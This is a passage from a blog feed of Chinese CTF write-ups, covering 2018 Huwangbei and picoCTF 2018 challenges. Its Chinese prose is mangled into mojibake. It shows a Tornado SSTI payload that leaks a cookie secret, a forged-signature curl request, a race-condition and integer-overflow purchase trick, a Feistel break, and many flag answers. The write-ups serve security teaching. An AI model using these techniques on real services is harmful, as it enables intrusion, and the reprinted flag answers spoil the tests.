class="string">"hex"</span>)</span><br></pre></td></tr></table></figure><p>ÂÅáËÆæÊúÄÂêé‰∏ÄËΩÆÁªìÊùüÂêéÈ´ò‰ΩéÂ≠óËäÇÂàÜÂà´‰∏∫l,rÔºåÂèØÈÄêËΩÆÈÄÜÊé®Âá∫‰∏ä‰∏ÄËΩÆÁöÑÂÄºÔºå‰ªéËÄåÂæóÂà∞ÊòéÊñáÂíåÂØÜÊñáÁöÑÂÖ≥Á≥ª„ÄÇÁî±Â∑≤Áü•ÁöÑ‰∏ÄÁªÑtestÊòéÊñáÂØÜÊñáÂØπÔºåÂèØÂæóÂà∞flagÁöÑÊòéÊñá„ÄÇ</p><table><thead><tr><th>round</th><th>left</th><th>right</th></tr></thead><tbody><tr><td>0</td><td>l^r^k[0]^k[1]^k[3]^k[4]^k[6]</td><td>l^k[1]^k[2]^k[4]^k[5]</td></tr><tr><td>1</td><td>l^k[1]^k[2]^k[4]^k[5]</td><td>r^k[2]^k[3]^k[5]^k[6]</td></tr><tr><td>2</td><td>r^k[2]^k[3]^k[5]^k[6]</td><td>l^r*k[3]^k[4]^k[6]</td></tr><tr><td>3</td><td>l^r*k[3]^k[4]^k[6]</td><td>l^k[4]^k[5]</td></tr><tr><td>4</td><td>l^k[4]^k[5]</td><td>r^k[5]^k[6]</td></tr><tr><td>5</td><td>r^k[5]^k[6]</td><td>r^l^k[6]</td></tr><tr><td>6</td><td>r^l^k[6]</td><td>l</td></tr><tr><td>7</td><td>l</td><td>r</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">all_xor = <span class="keyword">lambda</span> x:reduce(xor,x)</span><br><span class="line">test_plain=<span class="string">"c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5"</span></span><br><span class="line">test_cipher=<span class="string">"5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81"</span></span><br><span class="line">flag_cipher=<span class="string">"519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76"</span></span><br><span class="line"></span><br><span class="line">p=test_plain.decode(<span class="string">"hex"</span>)</span><br><span class="line">c=test_cipher.decode(<span class="string">"hex"</span>)</span><br><span class="line">f=flag_cipher.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">l,r=c[<span class="number">0</span>:<span class="number">27</span>],c[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">pl,pr=p[<span class="number">0</span>:<span class="number">27</span>],p[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">fl,fr=f[<span class="number">0</span>:<span class="number">27</span>],f[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">fcl=all_xor([l,r,pl,fl,fr])</span><br><span class="line">fcr=all_xor([l,pr,fl])</span><br><span class="line">flag=fcl+fcr</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment">#flag&#123;festel_weak_666_plo88112tty&#125;</span></span><br></pre></td></tr></table></figure><h1 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h1><p>‰ΩøÁî®burpÁöÑintruderÁ´û‰∫â‰π∞Â§ßËæ£Êù°ÔºåÂæóÂà∞Ë∂ÖËøá‰∫î‰∏™Â§ßËæ£Êù°„ÄÇ</p><p><img src="1539428933786.png" alt="1539428933786"></p><p>ÁÑ∂Âêé‰π∞ <code>2**64/5+1</code> ‰∏™Ëæ£Êù°ÁéãÔºå‰ΩøÂæóÈúÄË¶Å‰ªòÁöÑÂ§ßËæ£Êù°Â§öÂà∞uintË£Ö‰∏ç‰∏ãÔºåÂêë‰∏äÊ∫¢Âá∫‰∏∫Ë¥üÊï∞ÔºåÊàë‰ª¨Â∞±‰π∞ÂæóËµ∑ÂæàÂ§öÁöÑËæ£Êù°Áéã‰∫ÜÔºåÂÆûÁé∞‰∏ÄÂ§úÊö¥ÂØå„ÄÇ</p><p><img src="1539429086591.png" alt="1539429086591"></p><p>ÁÑ∂ÂêéflagÂ∞±Èöè‰æø‰π∞‰∫Ü„ÄÇ</p><p><img src="1539429113491.png" alt="1539429113491"></p><p><img src="1539437436657.png" alt="1539437436657"></p><h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>Êúâ‰∏â‰∏™ÊèêÁ§∫Ôºö</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.9:31465/file?filename=flag.txt&amp;signature=95660d430a8ad05fc7337d12e6a08b1a</span><br><span class="line">render()</span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure><p>Êä•ÈîôÈ°µÈù¢Â≠òÂú®SSTI„ÄÇ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ËÆøÈóÆ `http://49.4.78.9:31465/error?msg=&#123;&#123;handler.settings&#125;&#125;`ÂæóÂà∞ÈÖçÁΩÆ‰ø°ÊÅØ„ÄÇ</span><br><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;'login_url': '/login', 'template_path': 'templates', 'xsrf_cookies': True, 'cookie_secret': 'pGD*~9Y]N?&gt;5zBvS_3768U+O&#125;<span class="tag">&lt;<span class="name">#^k@oM$grqZQ4!yK1ucVnijmRJlFwI%hP(0exE',</span> '<span class="attr">debug</span>'<span class="attr">:</span> <span class="attr">False</span>, '<span class="attr">file_path</span>'<span class="attr">:</span> '/<span class="attr">www</span>/<span class="attr">static</span>/<span class="attr">files</span>', '<span class="attr">static_path</span>'<span class="attr">:</span> '<span class="attr">static</span>'&#125;</span></span><br></pre></td></tr></table></figure><p>ÂæóÂà∞cookie_secretÔºåÂç≥ÂèØÊûÑÈÄ†Á≠æÂêçËØªÂèñflag„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc@xyz:~$ curl <span class="string">"http://49.4.78.9:31465/file?filename=/fllllllllllag&amp;signature=8f270fa794962fa2ec4e63e6b03a830b"</span> -s | grep flag</span><br><span class="line">flag&#123;59a95928373bfa789e06635d2d5e9459&#125;</span><br></pre></td></tr></table></figure><p>ÂèÇËÄÉÔºö<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a> </p><h1 id="Êõ¥Â§öÈ¢òËß£"><a href="#Êõ¥Â§öÈ¢òËß£" class="headerlink" title="Êõ¥Â§öÈ¢òËß£"></a>Êõ¥Â§öÈ¢òËß£</h1><ul><li><a href="https://xz.aliyun.com/t/2893" target="_blank" rel="noopener">Êä§ÁΩëÊùØ2018Á∫ø‰∏äËµõ Writeup by Whitzard</a> </li><li><a href="https://xz.aliyun.com/t/2897" target="_blank" rel="noopener">2018Êä§ÁΩëÊùØÁ∫ø‰∏äËµõ Writeup by Â§©Êû¢</a> </li><li><a href="https://xz.aliyun.com/t/2892" target="_blank" rel="noopener">2018Êä§ÁΩëÊùØÁ∫ø‰∏äËµõÈ¢òËß£by Lilac</a> </li><li><a href="http://www.venenof.com/index.php/archives/565/" target="_blank" rel="noopener">Êä§ÁΩëÊùØ-easy laravel-Writeup</a> </li><li><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" target="_blank" rel="noopener">2018Êä§ÁΩëÊùØ-web-writeup</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;1539436751699.png&quot; alt=&quot;1539436751699&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;FEZ&quot;&gt;&lt;a href=&quot;#FEZ&quot; class=&quot;headerlink&quot; title=&quot;FEZ&quot;&gt;&lt;/a&gt;FEZ&lt;/h1&gt;&lt;figure clas
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>picoCTF-2018 Ëß£È¢òÊä•Âëä</title>
    <link href="https://findneo.github.io/180929-picoctf/"/>
    <id>https://findneo.github.io/180929-picoctf/</id>
    <published>2018-10-11T14:07:27.000Z</published>
    <updated>2019-01-25T23:21:37.114Z</updated>
    
    <content type="html"><![CDATA[<p><img src="1539266772853.png" alt="1539266772853"></p><p>È¢òÁõÆÔºö</p><ul><li><a href="https://2018game.picoctf.com/problems" target="_blank" rel="noopener">https://2018game.picoctf.com/problems</a></li><li>Â§áÁî®Ôºö<a href="https://findneo.github.io/p/picoCTF-2018-Problems.html">https://findneo.github.io/p/picoCTF-2018-Problems.html</a> </li><li>ÈôÑ‰ª∂Ôºö<a href="https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf</a> </li></ul><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Forensics-Warmup-1"><a href="#Forensics-Warmup-1" class="headerlink" title="Forensics Warmup 1"></a>Forensics Warmup 1</h2><p><code>picoCTF{welcome_to_forensics}</code> </p><h2 id="Forensics-Warmup-2"><a href="#Forensics-Warmup-2" class="headerlink" title="Forensics Warmup 2"></a>Forensics Warmup 2</h2><p><code>picoCTF{extensions_are_a_lie}</code> </p><h2 id="Desrouleaux"><a href="#Desrouleaux" class="headerlink" title="Desrouleaux"></a>Desrouleaux</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">nc 2018shell2.picoctf.com 63299</span><br><span class="line">You<span class="string">'ll need to consult the file `incidents.json` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones.</span></span><br><span class="line"><span class="string">250.226.237.236</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many unique destination IP addresses were targeted by the source IP address 193.1.59.100?</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places.</span></span><br><span class="line"><span class="string">1.43</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Great job. You'</span>ve earned the flag: picoCTF&#123;J4y_s0n_d3rUUUULo_23fa6fa6&#125;</span><br><span class="line"></span><br><span class="line">/*Á≤æÁ°ÆÂà∞Â∞èÊï∞ÁÇπÂêé‰∏§‰Ωç (1+1+2+1+3+1+1)/7=1.43</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">j=json.load(open(<span class="string">'incidents.json'</span>))</span><br><span class="line">tickets=j[<span class="string">'tickets'</span>]</span><br><span class="line">hashes=dict()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tickets:</span><br><span class="line"><span class="keyword">if</span> t[<span class="string">'file_hash'</span>] not <span class="keyword">in</span> hashes.keys():</span><br><span class="line">hashes[t[<span class="string">'file_hash'</span>]]=[t[<span class="string">'dst_ip'</span>]]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hashes[t[<span class="string">'file_hash'</span>]].append(t[<span class="string">'dst_ip'</span>])</span><br><span class="line"><span class="built_in">print</span> hashes</span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># u'78d8572c143fb161': [u'90.174.224.210'], </span></span><br><span class="line"><span class="comment"># u'a275ec611d018a67': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'308f80097c708e3d': [u'90.174.224.210', u'216.243.24.241'], </span></span><br><span class="line"><span class="comment"># u'27d9b03884d73aaa': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'23420f902d5382e1': [u'94.165.167.88', u'16.139.98.188', u'46.11.226.205'], </span></span><br><span class="line"><span class="comment"># u'ea45791ce3528103': [u'127.19.170.162'], </span></span><br><span class="line"><span class="comment"># u'729b56eab8ac3252': [u'94.165.167.88']&#125;</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h2 id="Reading-Between-the-Eyes"><a href="#Reading-Between-the-Eyes" class="headerlink" title="Reading Between the Eyes"></a>Reading Between the Eyes</h2><p><img src="1538361495312.png" alt="1538361495312"></p><p><code>picoCTF{r34d1ng_b37w33n_7h3_by73s}</code> </p><h2 id="Recovering-From-the-Snap"><a href="#Recovering-From-the-Snap" class="headerlink" title="Recovering From the Snap"></a>Recovering From the Snap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Ê°åÈù¢/picoctf<span class="comment"># file animals.dd</span></span><br><span class="line">animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="string">"mkfs.fat"</span>, sectors/cluster 4, root entries 512, sectors 20480 (volumes &lt;=32 MB), Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT (16 bit)</span><br><span class="line">root@kali:~/Ê°åÈù¢/picoctf<span class="comment"># fdisk -lu animals.dd</span></span><br><span class="line">Disk animals.dd: 10 MiB, 10485760 bytes, 20480 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br></pre></td></tr></table></figure><p>ÂèÇËÄÉ <a href="https://www.bleepingcomputer.com/forums/t/522890/imagedd-file-of-a-corrupted-external-hd-looking-to-mountrecover/" target="_blank" rel="noopener">ËøôÈáå</a> Ôºå‰ΩøÁî®<a href="https://www.osforensics.com/tools/mount-disk-images.html" target="_blank" rel="noopener">OSFMount</a> ÊåÇËΩΩÁ£ÅÁõòÔºå‰ΩøÁî® <a href="https://www.cgsecurity.org/wiki/TestDisk_Download" target="_blank" rel="noopener">TestDisk &amp; PhotoRec 7.1-WIP, Data Recovery</a> ÊÅ¢Â§çË¢´Âà†Èô§ÁöÑ<code>theflag.jpg</code> „ÄÇ</p><p><code>picoCTF{th3_5n4p_happ3n3d}</code> </p><p><img src="1538323453203.png" alt="1538323453203"></p><h2 id="admin-panel"><a href="#admin-panel" class="headerlink" title="admin panel"></a>admin panel</h2><p>Áî®wiresharkÊâìÂºÄÔºåÂØºÂá∫HTTPÂØπË±°ÔºåÂÖ∂‰∏≠‰∏Ä‰∏™Êñá‰ª∂ÂÜÖÂÆπÊòØ<code>user=admin&amp;password=picoCTF{n0ts3cur3_df598569}</code> „ÄÇ</p><h2 id="hex-editor"><a href="#hex-editor" class="headerlink" title="hex editor"></a>hex editor</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings hex_editor.jpg | grep pico</span><br><span class="line">Your flag is: <span class="string">"picoCTF&#123;and_thats_how_u_edit_hex_kittos_8BcA67a2&#125;"</span></span><br></pre></td></tr></table></figure><h2 id="Truly-an-Artist"><a href="#Truly-an-Artist" class="headerlink" title="Truly an Artist"></a>Truly an Artist</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 2018.png | grep pico</span><br><span class="line">picoCTF&#123;look_in_image_9f5be995&#125;</span><br></pre></td></tr></table></figure><h2 id="now-you-don‚Äôt"><a href="#now-you-don‚Äôt" class="headerlink" title="now you don‚Äôt"></a>now you don‚Äôt</h2><p><img src="1538239287549.png" alt="1538239287549"></p><p><code>picoCTF{n0w_y0u_533_m3}</code></p><h2 id="Ext-Super-Magic"><a href="#Ext-Super-Magic" class="headerlink" title="Ext Super Magic"></a>Ext Super Magic</h2><p>Ê†πÊçÆÊèêÁ§∫‰ΩøÁî®debugfsÊü•ÁúãimgÊñá‰ª∂ÔºåÂèëÁé∞ÂπªÊï∞ÊçüÂùè„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># debugfs ext.img</span></span><br><span class="line">debugfs 1.44.4 (18-Aug-2018)</span><br><span class="line">debugfs: Bad magic number <span class="keyword">in</span> super-block <span class="keyword">while</span> trying to open ext.img</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>‰ªéÊñáÊ°£Ôºà<a href="https://wiki.osdev.org/Ext2#Superblock" target="_blank" rel="noopener">https://wiki.osdev.org/Ext2#Superblock</a>ÔºâÂèØ‰ª•ÁúãÂà∞‰ΩøÁî®ext2Êñá‰ª∂Á≥ªÁªüÁöÑÁ¨¨‰∏ÄÊ≠•ÊòØÂØªÊâæ„ÄÅÊèêÂèñ„ÄÅËß£Êûêsuperblock„ÄÇsuperblockÊÄªÊòØ‰ªéÂç∑ÁöÑ1024Â≠óËäÇÂºÄÂßãÔºåÈïøÂ∫¶‰∏∫1024Â≠óËäÇ„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÂ¶ÇÊûú‰∏Ä‰∏™ÊâáÂå∫ÊòØ512Â≠óËäÇÔºåÈÇ£‰πàsuperblock‰Ωç‰∫éÁ¨¨2„ÄÅ3ÊâáÂå∫„ÄÇËÄåÂú®superblock‰∏≠Ôºåext2Êñá‰ª∂ÁöÑsignatureÔºà0xef53Ôºâ‰Ωç‰∫éÁ¨¨56„ÄÅ57‰∏§‰∏™Â≠óËäÇÔºåÊâÄ‰ª•Êàë‰ª¨Ë¶Å‰øÆÊ≠£Êñá‰ª∂ÁöÑmagic number‰∏∫Ê≠£Á°ÆÁöÑsignatureÔºå‰πüÂ∞±ÊòØ‰øÆÊîπ(1024+56,1024+57)bytesÂç≥(1080,1081)bytesÂç≥(0x438,0x439)bytesÁöÑÂÄº‰∏∫<code>0xef53</code> „ÄÇÈúÄÊ≥®ÊÑèÈááÁî®Â∞èÁ´ØÂ∫èÔºå‰ΩéÂ≠óËäÇÂú®‰ΩéÂú∞ÂùÄ„ÄÇ</p><p><img src="1541167493772.png" alt="1541167493772"></p><p>Ê†πÊçÆÊñáÊ°£‰øÆÊîπsuperblockÔºåÁÑ∂ÂêéÂèØ‰ª•mountÂà∞Á≥ªÁªüÔºåÂèëÁé∞Êúâ‰∏™flagÂõæÁâá„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file fix.img</span></span><br><span class="line">fix.img: Linux rev 1.0 ext2 filesystem data, UUID=a3708ef2-5ec0-4463-9a03-599c890645cd (large files)</span><br><span class="line"><span class="comment"># xxd ext.img &gt; ext.hex</span></span><br><span class="line"><span class="comment"># xxd fix.img &gt; fix.hex</span></span><br><span class="line"><span class="comment"># diff *.hex</span></span><br><span class="line">68c68</span><br><span class="line">&lt; 00000430: 34dc ad5b 0100 ffff 0000 0100 0100 0000  4..[............</span><br><span class="line">---</span><br><span class="line">&gt; 00000430: 34dc ad5b 0100 ffff 53ef 0100 0100 0000  4..[....S.......</span><br><span class="line"><span class="comment"># mkdir tmpdir &amp;&amp; mount fix.img tmpdir &amp;&amp; ll tmpdir/ | grep flag</span></span><br></pre></td></tr></table></figure><p><img src="1541122722339.png" alt="1541122722339"></p><p><img src="1541122685539.png" alt="1541122685539"></p><p>Â∞ùËØï‰∫ÜÂ§ö‰∏™ÂëΩ‰ª§Ë°åOCRÂ∑•ÂÖ∑Ôºåtesseract-ocrÊïàÊûúÊúÄÂ•ΩÔºå‰ΩÜËØÜÂà´ÁªìÊûúËøòÈúÄË¶Å‰øÆÊ≠£„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$apt</span> install gocr</span><br><span class="line"><span class="variable">$apt</span> install cuneiform</span><br><span class="line"><span class="variable">$apt</span> install tesseract-ocr</span><br><span class="line"><span class="variable">$tesseract</span> cut_flag.jpg res &amp;&amp; cat res.txt</span><br><span class="line">Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica</span><br><span class="line">Your flag is: <span class="string">"picoCTF &#123;FDBfbc6141e7F 4bscI90CIaE7SbI63aEf&#125; "</span></span><br></pre></td></tr></table></figure><p>ÊúÄÂêéÁªìÊûúÔºö<code>picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}</code></p><h2 id="Lying-Out"><a href="#Lying-Out" class="headerlink" title="Lying Out"></a>Lying Out</h2><p>Ê†πÊçÆÊó•Â∏∏ÊµÅÈáèÂõæÂà§Êñ≠ÊµÅÈáèÂèØËÉΩÂºÇÂ∏∏ÁöÑÊó∂Èó¥ÁÇπ„ÄÇ</p><p><img src="1538371756947.png" alt="1538371756947"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">log=[</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10800</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">11050</span>,<span class="number">10650</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10950</span>,<span class="number">10950</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11100</span>,<span class="number">11900</span>,<span class="number">13400</span>,</span><br><span class="line">    <span class="number">13800</span>,<span class="number">13400</span>,<span class="number">12000</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">11050</span>,<span class="number">11800</span>,<span class="number">13100</span>,<span class="number">14600</span>,<span class="number">16100</span>,</span><br><span class="line">    <span class="number">16600</span>,<span class="number">16400</span>,<span class="number">14400</span>,<span class="number">12800</span>,<span class="number">11800</span>,<span class="number">11000</span>,<span class="number">10950</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10900</span>,<span class="number">10850</span>,<span class="number">10850</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11400</span>,<span class="number">11900</span>,<span class="number">13000</span>,<span class="number">14000</span>,</span><br><span class="line">    <span class="number">14800</span>,<span class="number">15800</span>,<span class="number">16200</span>,<span class="number">15800</span>,<span class="number">14700</span>,<span class="number">13700</span>,<span class="number">12200</span>,<span class="number">12100</span>,</span><br><span class="line">    <span class="number">11100</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10950</span>,<span class="number">10900</span>,<span class="number">10800</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">39410</span>)</span><br><span class="line">prompt=r.recvuntil(<span class="string">'num_IPs'</span>)</span><br><span class="line">data=r.recv()</span><br><span class="line">nums=data.split()</span><br><span class="line"><span class="keyword">print</span> prompt,<span class="string">'\n'</span>,nums</span><br><span class="line">group=len(nums)/<span class="number">4</span></span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(group):</span><br><span class="line">t=nums[i*<span class="number">4</span>+<span class="number">2</span>].split(<span class="string">':'</span>)</span><br><span class="line">tt=int(t[<span class="number">0</span>])*<span class="number">4</span>+int(t[<span class="number">1</span>])/<span class="number">15</span></span><br><span class="line"><span class="keyword">if</span> int(nums[i*<span class="number">4</span>+<span class="number">3</span>])&gt;log[tt]:</span><br><span class="line">res.append(nums[i*<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">' '</span>.join(res))</span><br><span class="line"><span class="keyword">print</span> <span class="string">' '</span>.join(res),r.recv()</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410</span></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204</span></span><br><span class="line"><span class="comment"># [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done</span></span><br><span class="line"><span class="comment"># You'll need to consult the file `traffic.png` to answer the following questions.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.</span></span><br><span class="line"><span class="comment">#     log_ID      time  num_IPs </span></span><br><span class="line"><span class="comment"># ['0', '0', '01:00:00', '11637', '1', '1', '01:30:00', '11640', '2', '2', '02:45:00', '11616', '3', '3', '10:45:00', '9962', 